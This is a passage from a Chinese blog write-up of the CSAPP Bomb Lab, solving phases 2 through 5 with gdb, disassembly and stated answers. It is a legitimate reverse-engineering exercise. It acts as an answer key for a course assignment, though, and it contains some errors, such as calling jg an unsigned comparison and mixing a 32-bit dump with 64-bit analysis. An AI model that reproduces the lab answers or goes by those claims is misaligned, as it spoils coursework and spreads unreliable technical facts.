eax,eax</span><br></pre></td></tr></table></figure><p>然后再比较，那么第二个数不就应该是2了吗？，虽然我也不知道为什么<code>ptr[rbx]</code>它就是第二个数，但是稍微想想也知道肯定是依次对你的输入去判断的，所以第二个数是2了。同理，他每次都加上自己，那么每次输入的数就是前面数的两倍，那清晰了，答案应该就是<code>1 2 4 8 16 32</code>。清除断点输入后发现没有爆炸，那么phase_2也拆弹成功了。</p><h2 id="phase-3"><a href="#phase-3" class="headerlink" title="phase_3"></a>phase_3</h2><p>然后断点下在phase_3，接着运行到那边。运行到scanf发现格式化字符串为”%d %d”，那就是两个整数，并且看到后面有一个<code>cmp eax,1</code>，并且要求<code>eax&gt;1</code>，否则就执行爆炸函数了，<code>eax</code>在<code>scanf</code>之后获得了<code>scanf</code>函数的返回值，scanf的返回值就是输入数的个数。那我们就随便输入俩数看看。</p><p><img src="https://i.loli.net/2021/04/25/JPg3Rp4u7Tjr6If.png" alt="bomblab_phase_3_1.png"></p><p>继续调试发现，如果<code>ptr[rsp+8]</code>大于<code>7</code>会发生跳转不妨先输入大于<code>7</code>的值看看会跳转到哪儿，输入之后，好的，成功爆炸，躲不掉的那种哦。</p><p><img src="https://i.loli.net/2021/04/25/etqlSa591MrFCVp.png" alt="bomblab_phase_3_2.png"></p><p>那看来我们第一个数只能输入<code>0~7</code>之内的值，我们先输入<code>0 0</code>来看看，继续单步调试发现</p><p><img src="https://i.loli.net/2021/04/25/mz7utwg8CNbLYPU.png" alt="bomblab_phase_3_3.png"></p><p>那说明我们应该输入<code>0 207</code>，因为<code>eax</code>被赋值了<code>0xcf</code>，然后又比较中也含有<code>eax</code>重新来一遍发现竟然过了，直接能进入到phase_4的那种，那么你就会思考，<code>1~7</code>会发生什么，据测试，每个数对应了一个整数，你可以理解为有一个函数<code>f(x)x∈[0,7]∩Z</code>然后你必须正确输入<code>x f(x)</code>的其中一个对应。那你可能还会想，负数有没有对应，其实我也试过，负数直接就不行了，因为<code>jg</code>指令是判断无符号数的，负数就会被看成一个很大的正整数，那么你还是不可避免的爆炸了。</p><h2 id="phase-4"><a href="#phase-4" class="headerlink" title="phase_4"></a>phase_4</h2><p>在<code>phase_4</code>处断点，依次输入前三条拆弹语句，第四句老规矩输入很多<code>a</code>，<code>s</code>单步调试进入<code>scanf</code>，发现语句依然是<code>%d %d</code>，好嘛，又是两个整型，那重来，先<code>0 0</code>，<code>n</code>单步调试进去发现有一个语句<code>cmp eax,2 jne</code>，<code>jne</code>为<code>jump not equal</code>这个判断也很简单，就是看<code>scanf</code>有没有输入2个数，它都是<code>%d %d</code>了，肯定你只能输入两个数啊，不是两个就爆炸了(<del>Ps:别问我为什么这么肯定的</del>)。</p><p><img src="https://i.loli.net/2021/04/25/fTMdxrpsWg1ocXE.png" alt="bomblab_phase_4_1.png"></p><p>输入两个<code>0</code>发现莫名其妙过了，其实我想就这么水过去的，但是还得去分析的。</p><p><code>disassemble func4</code>查看一下它那个函数的汇编代码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">Dump of assembler code for function func4:</span><br><span class="line">   0x08048d0b &lt;+0&gt;:    sub    $0x1c,%esp</span><br><span class="line">   0x08048d0e &lt;+3&gt;:    mov    %ebx,0x14(%esp)</span><br><span class="line">   0x08048d12 &lt;+7&gt;:    mov    %esi,0x18(%esp)</span><br><span class="line">   0x08048d16 &lt;+11&gt;:    mov    0x20(%esp),%eax</span><br><span class="line">   0x08048d1a &lt;+15&gt;:    mov    0x24(%esp),%edx</span><br><span class="line">   0x08048d1e &lt;+19&gt;:    mov    0x28(%esp),%esi </span><br><span class="line">   0x08048d22 &lt;+23&gt;:    mov    %esi,%ecx</span><br><span class="line">   0x08048d24 &lt;+25&gt;:    sub    %edx,%ecx       </span><br><span class="line">   0x08048d26 &lt;+27&gt;:    mov    %ecx,%ebx</span><br><span class="line">   0x08048d28 &lt;+29&gt;:    shr    $0x1f,%ebx    </span><br><span class="line">   0x08048d2b &lt;+32&gt;:    add    %ebx,%ecx     </span><br><span class="line">   0x08048d2d &lt;+34&gt;:    sar    %ecx          </span><br><span class="line">   0x08048d2f &lt;+36&gt;:    lea    (%ecx,%edx,1),%ebx    </span><br><span class="line">   0x08048d32 &lt;+39&gt;:    cmp    %eax,%ebx</span><br><span class="line">   0x08048d34 &lt;+41&gt;:    jle    0x8048d4d &lt;func4+66&gt;</span><br><span class="line">   0x08048d36 &lt;+43&gt;:    lea    -0x1(%ebx),%ecx</span><br><span class="line">   0x08048d39 &lt;+46&gt;:    mov    %ecx,0x8(%esp)</span><br><span class="line">   0x08048d3d &lt;+50&gt;:    mov    %edx,0x4(%esp)</span><br><span class="line">   0x08048d41 &lt;+54&gt;:    mov    %eax,(%esp)</span><br><span class="line">   0x08048d44 &lt;+57&gt;:    call   0x8048d0b &lt;func4&gt;</span><br><span class="line">   0x08048d49 &lt;+62&gt;:    add    %eax,%ebx   </span><br><span class="line">   0x08048d4b &lt;+64&gt;:    jmp    0x8048d66 &lt;func4+91&gt;</span><br><span class="line">   0x08048d4d &lt;+66&gt;:    cmp    %eax,%ebx  </span><br><span class="line">   0x08048d4f &lt;+68&gt;:    jge    0x8048d66 &lt;func4+91&gt;</span><br><span class="line">   0x08048d51 &lt;+70&gt;:    mov    %esi,0x8(%esp)</span><br><span class="line">   0x08048d55 &lt;+74&gt;:    lea    0x1(%ebx),%edx </span><br><span class="line">   0x08048d58 &lt;+77&gt;:    mov    %edx,0x4(%esp)</span><br><span class="line">   0x08048d5c &lt;+81&gt;:    mov    %eax,(%esp)</span><br><span class="line">   0x08048d5f &lt;+84&gt;:    call   0x8048d0b &lt;func4&gt;</span><br><span class="line">   0x08048d64 &lt;+89&gt;:    add    %eax,%ebx  </span><br><span class="line">   0x08048d66 &lt;+91&gt;:    mov    %ebx,%eax   </span><br><span class="line">   0x08048d68 &lt;+93&gt;:    mov    0x14(%esp),%ebx</span><br><span class="line">   0x08048d6c &lt;+97&gt;:    mov    0x18(%esp),%esi</span><br><span class="line">   0x08048d70 &lt;+101&gt;:    add    $0x1c,%esp</span><br><span class="line">   0x08048d73 &lt;+104&gt;:    ret    </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><p>这个函数先放在这我们先看后面有哪些条件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">test   eax, eax</span><br><span class="line">jne    phase_4+76 &lt;phase_4+76&gt; </span><br><span class="line">cmp    dword ptr [rsp + 0xc], 0</span><br><span class="line">je     phase_4+81 &lt;phase_4+81&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>第一次是跳转会爆炸，第二次是不跳转会爆，那么换言之，两次都必须等于，那么第一次的<code>test eax,eax</code>它干什么了呢？先想一想它怎么判断两个数相等，两个数相等当且仅当它们之差为0时成立，字符串也同理。那么换言之，它就判断<code>eax</code>的值是不是<code>0</code>而已相等为<code>0</code>，不相等则不为<code>0</code>。那么很清楚了，防止它跳转，我们要保证<code>eax</code>寄存器值为0。下面就是判断第二个输入的值是否为0了，为0跳转。</p><p><img src="https://i.loli.net/2021/04/25/usg2zr6lbFYjwhE.png" alt="bomblab_phase_4_2.png"></p><p>实际上，这里的<code>ptr[rsp+0xc]</code>就是我们输入第二个数的低八位。因此第二个数只能输入<code>0</code>因为第一次比较用到了寄存器比较，我们也不知道运行这个函数之后函数的返回值是多少(<code>rax</code>保存函数返回值)，只能去调试看看。因此这个答案是<code>0 0</code></p><h2 id="phase-5"><a href="#phase-5" class="headerlink" title="phase_5"></a>phase_5</h2><p>依然先断点，输入之前四句拆弹语句。到这里之后随便输入点东西，发现了</p><p><img src="https://i.loli.net/2021/04/25/sQSBH3YFexy6dNJ.png" alt="bomblab_phase_5_1.png"></p><p>这回是要输入一串字符串，而且还有长度检测，不等于6直接爆炸qwq。</p><p>那我们先随便输入一个<code>aaaaaa</code>看看情况</p><p><img src="https://i.loli.net/2021/04/25/JaWfPYRIysXc9qU.png" alt="bomblab_phase_5_2.png"></p><p>很明显，有一个循环，以<code>eax</code>为循环变量，依次对输入的字符进行一系列的操作。具体操作是：先对字符<code>and 0xf</code>然后把结果保存在<code>rdx</code>里面，返回的字符是<code>0x4024b0+rdx</code>,最后这个保存到<code>rsp+rax+0x10</code>里面，在往栈底偏移<code>0x10</code>的地方起一个保存好的字符串。接下来又要怎么操作呢？接着单步调试看看：</p><p><img src="https://i.loli.net/2021/04/25/SiLjU51Z3BroAk9.png" alt="bomblab_phase_5_3.png"></p><p>发现在<code>rsp+0x10</code>那个位置的字符串要被<code>&quot;flyers&quot;</code>字符串比较，相等跳转，不跳转就炸了，那么唯一没有看的就是刚刚那个<code>0x4024b0+rdx</code>到底是什么了。但是可以猜测这应该是一个字符串，然后<code>rdx</code>做偏移取字符串的下标对应的字符。<code>print (char *)0x4024b0</code>查看这个字符串发现输出了一个很长的东西<code>maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?</code>因为可以看到它的偏移被<code>and 0xf</code>可以很容易证明这个偏移肯定小于等于<code>0xf</code>，那么我们取出16位的字符串<code>maduiersnfotvbyl</code>,<code>flyers</code>的话，它的偏移可以是：<code>9 15 14 5 6 7</code>这里建议大家写脚本跑一下，自己硬算也可以的。为了防止字符无效，我们尽量取满可能，因为偏移是固定的，但是高四位不管是什么都是可以的，反正最后要被<code>and 0xf</code></p><p><img src="https://i.loli.net/2021/04/25/EWxXJ2PuAQ3HoIc.png" alt="bomblab_phase_5_4.png"></p><p>因为每个字符都是相互独立的，所以你可以在这六行任意取一个可读字符最后拼接成字符串。因为有些字符不可编辑，所以采取这种措施是最妙的。</p><h2 id="phase-6"><a href="#phase-6" class="headerlink" title="phase_6"></a>phase_6</h2><p>待更新</p><p>因为作者目前比较菜，phase_6和secret_bomb都不会做，如果上面有哪里说的不对的恳请指正。</p>]]></content>
      
      
      <categories>
          
          <category> csapp </category>
          
          <category> lab </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
